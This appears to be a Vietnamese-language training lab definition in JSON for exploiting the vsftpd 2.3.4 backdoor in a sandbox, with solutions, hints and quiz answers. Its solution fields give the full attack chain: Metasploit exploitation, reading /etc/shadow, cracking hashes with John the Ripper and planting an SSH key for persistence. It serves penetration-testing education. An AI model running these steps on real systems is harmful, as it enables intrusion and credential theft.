@@ -1,0 +1,274 @@
+{
+  "title" : "LAB 1: Khai thác lỗ hổng trong dịch vụ FTP và backdoor",
+  "description" : "",
+  "prerequisites" : [ ],
+  "outcomes" : [ "Hiểu được kiến trúc nền tảng và quản trị hệ thống", "Kỹ thuật thu thập thông tin và khai thác lỗ hỏng" ],
+  "state" : "RELEASED",
+  "levels" : [ {
+    "title" : "Giới thiệu bài tập",
+    "level_type" : "INFO_LEVEL",
+    "order" : 0,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "content" : "* Bài tập mô phỏng kịch bản tấn công nhằm khai thác một dịch vụ mạng chứa lỗ hổng bảo mật không được vá lỗi.\n* Trainee đóng vai trò là một pentester, dùng máy tấn công Kali Linux để thực hiện tấn công vào máy nạn nhân để đánh giá độ nguy hiểm của lỗ hổng này.\n* Các công cụ cần thiết đã được cài đặt sẵn, Trainee không thực hiện cài đặt thêm các công cụ khác.\n* Mục đích của bài tập này là giúp Trainee nắm được quy trình cơ bản của cách khai thác một lỗ hổng: quá trình trinh sát, xác định lỗ hổng, khai thác lỗ hổng, leo thang đặc quyền, khai thác thông tin thu được và thiết lập backdoor.\n"
+  }, {
+    "title" : "Truy cập",
+    "level_type" : "ACCESS_LEVEL",
+    "order" : 1,
+    "estimated_duration" : 0,
+    "minimal_possible_solve_time" : null,
+    "passkey" : "start",
+    "cloud_content" : "Nhiệm vụ đầu tiên là truy cập vào sandbox. \n\n### Cách truy cập sandbox\n1. Ở phần topology bên phải, nhấp chuột phải vào máy **`attacker`**, sau đó chọn **`Open GUI`**.\n2. Đăng nhập với tài khoản **`user`** và mật khẩu **`Password123`**.\n3. Sau khi kết nối thành công, nộp đáp án **`start`**.",
+    "local_content" : "Before proceeding further, you need to start a sandbox on your machine. \nPlease clone [this Gitlab repository](https://<link_to_a_repo>) and follow steps in the README file.\nWhen your sandbox is ready at your host, submit the passkey from the README file."
+  }, {
+    "title" : "Bài 1: Xác định các dịch vụ lỗi thời đang chạy trên máy chủ mục tiêu",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 2,
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 7,
+    "answer" : "vsftpd 2.3.4",
+    "answer_variable_name" : null,
+    "content" : "Máy chủ mục tiêu có địa chỉ IP 10.1.26.9. Nhiệm vụ của bạn là sử dụng công cụ có sẵn trên máy Kali để:\n* Quét và xác nhận địa chỉ IP, trạng thái hoạt động của máy mục tiêu\n* Quét chi tiết các cổng (port) đang mở và xác định phiên bản của từng dịch vụ đang chạy trên máy mục tiêu \n* Từ kết quả thu được, xác định dịch vụ nào đang chạy phiên bản lỗi thời, có khả năng chứa lỗ hổng bảo mật đã được công bố\n\n\nĐáp án có dạng {service version}.\n\n",
+    "solution" : "Sử dụng công cụ nmap với lệnh `nmap -sV 10.1.26.9` \n\nĐáp án là **`${ANSWER}`**\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Tra cứu lỗ hỏng",
+      "content" : "Gợi ý: hãy đối chiếu tên và phiên bản dịch vụ tìm được với cơ sở dữ liệu lỗ hổng tại https://www.cve.org để xác nhận.",
+      "hint_penalty" : 5,
+      "order" : 1
+    }, {
+      "title" : "Công cụ sử dụng",
+      "content" : "Gợi ý: dùng công cụ Nmap để quét",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : false,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0043.T1595"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Bài 2: Tìm và thực hiện lệnh khai thác lỗ hổng dựa trên dịch vụ đã xác định",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 3,
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 7,
+    "answer" : null,
+    "answer_variable_name" : "root_flag",
+    "content" : "Từ dịch vụ lỗi thời đã xác định được ở Bài 1, hãy dùng công cụ có sẵn trên máy Kali để khai thác lỗ hổng của dịch vụ này. \nMục tiêu chính: chiếm được quyền truy cập (shell) trên máy mục tiêu.\n\nĐáp án là nội dung của tệp tin flag.txt",
+    "solution" : "Sử dụng công cụ metaploit: \n1. Mở console của công cụ bằng cách sử dụng lệnh `msfconsole`\n2. Tìm kiếm lỗ hỏng của bài tập trước `search vsftpd 2.3.4`\n3. Thiết lập biến cho rhost: `set rhost 10.1.26.9`\n4. Cuối cùng, là khai thác `exploit`\n5. Truy cập vào thư mục root `cd /root`\n6. `cat flag.txt`\n\nĐáp án là **`${ANSWER}`**\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Tìm cờ",
+      "content" : "Gợi ý: Để vào được thư mục của root phải thăng quyền",
+      "hint_penalty" : 5,
+      "order" : 1
+    }, {
+      "title" : "Công cụ hỗ trợ",
+      "content" : "Gợi ý: Dùng công cụ Metasploit Framework",
+      "hint_penalty" : 3,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : true,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0001.T1190"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Bài 3: Tìm kiếm thông tin tài khoản người dùng trên máy mục tiêu sau khi khai thác",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 4,
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 7,
+    "answer" : null,
+    "answer_variable_name" : "hidden_context",
+    "content" : "Sau khi khai thác máy mục tiêu thành công ở Bài 2, hiện tại bạn đang có quyền root, nhiệm vụ của bạn là: \n- Tìm tệp chứa thông tin có giá trị khai thác của người dùng \n- Tệp tin có bắt đầu bằng `con*****`\n\nĐáp án là `nội dung file`. ",
+    "solution" : "Sử dụng lệnh `find / -type f -name \".con*\" 2>/dev/null`. \n\nSau khi thực thi lệnh sẽ xuất hiện tệp tin có tên là `contract`. \n\nĐọc nội dung file. \n\nĐáp án là **`${ANSWER}`**\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Tệp tin",
+      "content" : "Tệp tin cần tìm là tệp tin ẩn được đặt trong thư mục của user ",
+      "hint_penalty" : 5,
+      "order" : 1
+    }, {
+      "title" : "Công cụ sử dụng",
+      "content" : "Sử dụng lệnh `find` để  tìm tệp tin",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : true,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0007.T1033"
+    }, {
+      "technique_key" : "TA0007.T1087"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Bài 4: Bẻ khóa mật khẩu người dùng ",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 5,
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 7,
+    "answer" : null,
+    "answer_variable_name" : "lab_password",
+    "content" : "Nhiệm vụ của bạn là:\n* Tìm nơi lưu mật khẩu của các user trên máy chủ.\n* Xác định thuật toán băm của chuỗi hash\n* Sử dụng công cụ có sẵn trên máy Kali để giải mã chuỗi hash\n* Wordlist sử dụng có tên passlist\n\nĐáp án là kết quả sau khi giải mã chuỗi hash",
+    "solution" : "1. Đọc tệp tin lưu mã hash mật khẩu trên hệ thống `cat /etc/shadow`\n2. Sau đó, lưu mã hash vào tệp tin bằng lệnh `nano pass` sau đó dán chuỗi hash vào\n3. Sử dụng công cụ john với wordlist là passlist.txt `john --wordlist=/usr/share/wordlists/passlist.txt pass`\n\nĐáp án là **`${ANSWER}`**\n",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Công cụ sử dụng",
+      "content" : " Gợi ý: Sử dụng công cụ John the Ripper",
+      "hint_penalty" : 5,
+      "order" : 0
+    }, {
+      "title" : "wordlist sử dụng",
+      "content" : "Gợi ý: /usr/share/wordlists/passlist.txt",
+      "hint_penalty" : 5,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : true,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0006.T1110"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Bài 5: Duy trì đăng nhập ",
+    "level_type" : "TRAINING_LEVEL",
+    "order" : 6,
+    "estimated_duration" : 20,
+    "minimal_possible_solve_time" : 7,
+    "answer" : null,
+    "answer_variable_name" : "backdoor_flag",
+    "content" : "Để duy trì đăng nhập, tránh việc quản trị viên vá lỗi phiên bản hay tài khoản crack được bài trước bị đổi mật khẩu.\n\nTrên server vẫn còn 1 user, hãy tìm cách thêm key SSH cá nhân vào user đó để có khả năng duy trì được kết nối.\n\nĐáp án là banner khi SSH thành công",
+    "solution" : "Sử dụng shell còn chiếm được ở bài 2. \n1. Tạo key SSH trên máy attacker `ssh-keygen -t ed25519 -C \"william@company.com\"`\n2. Thêm key public vào tệp tin authorized_keys \n3. SSH vào lại server với key private được lưu trên máy attacker\n\nĐáp án là ${ANSWER}",
+    "solution_penalized" : true,
+    "hints" : [ {
+      "title" : "Chuẩn bị khóa",
+      "content" : "Tạo khóa SSH trên máy attacker",
+      "hint_penalty" : 5,
+      "order" : 0
+    }, {
+      "title" : "Vị trí đặt khóa",
+      "content" : "Hãy tìm đến tệp tin authorized_keys trên user đó. Và lưu khóa đã chuẩn bị sẵn vaò tệp tin này",
+      "hint_penalty" : 5,
+      "order" : 1
+    } ],
+    "incorrect_answer_limit" : 10,
+    "attachments" : [ ],
+    "max_score" : 20,
+    "variant_answers" : true,
+    "reference_solution" : [ ],
+    "mitre_techniques" : [ {
+      "technique_key" : "TA0004.T1098"
+    } ],
+    "expected_commands" : [ ],
+    "commands_required" : true
+  }, {
+    "title" : "Kiểm tra kiến thức",
+    "level_type" : "ASSESSMENT_LEVEL",
+    "order" : 7,
+    "estimated_duration" : 25,
+    "minimal_possible_solve_time" : 2,
+    "questions" : [ {
+      "question_type" : "FFQ",
+      "text" : "Công cụ dùng để khai thác lỗ hổng trong bài thực hành là gì?",
+      "points" : 10,
+      "penalty" : 1,
+      "order" : 0,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "metasploit",
+        "correct" : true,
+        "order" : 0
+      }, {
+        "text" : "Metasploit",
+        "correct" : true,
+        "order" : 1
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "Module nào của công cụ nmap dùng để dò phiên bản dịch vụ/daemon trên máy chủ?",
+      "points" : 10,
+      "penalty" : 1,
+      "order" : 1,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "nmap -sV 10.1.26.9",
+        "correct" : true,
+        "order" : 0
+      }, {
+        "text" : "nmap -p- 10.1.26.9",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : "nmap --top-ports 22 10.1.26.9",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "nmap -sn 10.1.26.0/24",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "EMI",
+      "text" : "Chọn đáp án sao cho 2 cột tương ứng với nhau.",
+      "points" : 10,
+      "penalty" : 1,
+      "order" : 2,
+      "answer_required" : true,
+      "extended_matching_options" : [ {
+        "text" : "Tệp tin ẩn",
+        "order" : 0
+      }, {
+        "text" : "Tìm dò tệp tin/thư mục",
+        "order" : 1
+      }, {
+        "text" : "Bẻ khóa mật khẩu",
+        "order" : 2
+      }, {
+        "text" : "Truy cập từ xa",
+        "order" : 3
+      } ],
+      "extended_matching_statements" : [ {
+        "text" : "john",
+        "order" : 0,
+        "correct_option_order" : 2
+      }, {
+        "text" : "ssh",
+        "order" : 1,
+        "correct_option_order" : 3
+      }, {
+        "text" : "find",
+        "order" : 2,
+        "correct_option_order" : 1
+      }, {
+        "text" : ".contract",
+        "order" : 3,
+        "correct_option_order" : 0
+      } ]
+    } ],
+    "instructions" : "Kiểm tra lại kiến thức còn nhắm được sau khi thực hành",
+    "assessment_type" : "TEST"
+  } ],
+  "estimated_duration" : 125,
+  "variant_sandboxes" : false
+}
